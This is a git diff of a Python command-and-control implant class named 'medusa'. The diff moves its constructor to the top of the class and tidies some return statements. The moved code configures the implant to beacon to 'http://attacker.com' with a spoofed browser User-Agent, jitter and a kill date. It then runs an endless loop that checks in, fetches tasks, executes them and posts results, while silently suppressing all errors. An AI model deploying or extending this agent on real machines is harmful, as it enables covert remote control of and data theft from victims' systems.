@@ -1,7 +1,7 @@
 '''
  # @ Author: Taylor Brierley
  # @ Create Time: 2024-09-16 09:48:58
- # @ Modified by: Taylor Brierley
+ # @ Modified by: Taylor Brierley, Newt Tan
  # @ Modified time: 2024-09-16 09:49:52
  # @ Description:
  '''
@@ -222,6 +222,50 @@ class AES:
 
 
 class medusa:
+
+    def __init__(self):
+        self.socks_open = {}
+        self.socks_in = queue.Queue()
+        self.socks_out = queue.Queue()
+        self.taskings = []
+        self._meta_cache = {}
+        self.moduleRepo = {}
+        self.current_directory = os.getcwd()
+        self.agent_config = {
+            "Server": "http://attacker.com",
+            "Port": "80",
+            "PostURI": "/data",
+            "PayloadUUID": "89fe22f1-1cfe-4b65-af5e-76cf4497a9fd",
+            "UUID": "",
+            "Headers": {"User-Agent": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"},
+            "Sleep": 10,
+            "Jitter": 23,
+            "KillDate": "2025-09-13",
+            "enc_key": {"dec_key": None, "enc_key": None, "value": "none"},
+            "ExchChk": "False",
+            "GetURI": "/index",
+            "GetParam": "q",
+            "ProxyHost": "",
+            "ProxyUser": "",
+            "ProxyPass": "",
+            "ProxyPort": "",
+        }
+
+        while(True):
+            if(self.agent_config["UUID"] == ""):
+                self.checkIn()
+                self.agentSleep()
+            else:
+                while(True):
+                    if self.passedKilldate():
+                        self.exit()
+                    try:
+                        self.getTaskings()
+                        self.processTaskings()
+                        self.postResponses()
+                    except: pass
+                    self.agentSleep()                   
+
     def get_system_info(self):
         hostname = socket.gethostname()
         ip_address = socket.gethostbyname(hostname)
@@ -288,9 +332,12 @@ class medusa:
                 hmac = new(key, iv + ct, 'sha256').digest()
                 if compare_digest(hmac, received_hmac):
                     return (uuid + AES(key).decrypt_cbc(ct, iv)).decode()
-                else: return ""
-            else: return ""
-        else: return data.decode()
+                else: 
+                    return ""
+            else: 
+                return ""
+        else: 
+            return data.decode()
 
 
     def getOSVersion(self):
@@ -490,51 +537,6 @@ class medusa:
         with open(file_path, 'r') as f:
             content = f.readlines()
             return ''.join(content)
-
-
-
-    def __init__(self):
-        self.socks_open = {}
-        self.socks_in = queue.Queue()
-        self.socks_out = queue.Queue()
-        self.taskings = []
-        self._meta_cache = {}
-        self.moduleRepo = {}
-        self.current_directory = os.getcwd()
-        self.agent_config = {
-            "Server": "http://attacker.com",
-            "Port": "80",
-            "PostURI": "/data",
-            "PayloadUUID": "89fe22f1-1cfe-4b65-af5e-76cf4497a9fd",
-            "UUID": "",
-            "Headers": {"User-Agent": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"},
-            "Sleep": 10,
-            "Jitter": 23,
-            "KillDate": "2025-09-13",
-            "enc_key": {"dec_key": None, "enc_key": None, "value": "none"},
-            "ExchChk": "False",
-            "GetURI": "/index",
-            "GetParam": "q",
-            "ProxyHost": "",
-            "ProxyUser": "",
-            "ProxyPass": "",
-            "ProxyPort": "",
-        }
-
-        while(True):
-            if(self.agent_config["UUID"] == ""):
-                self.checkIn()
-                self.agentSleep()
-            else:
-                while(True):
-                    if self.passedKilldate():
-                        self.exit()
-                    try:
-                        self.getTaskings()
-                        self.processTaskings()
-                        self.postResponses()
-                    except: pass
-                    self.agentSleep()                   
 
 if __name__ == "__main__":
     medusa = medusa()
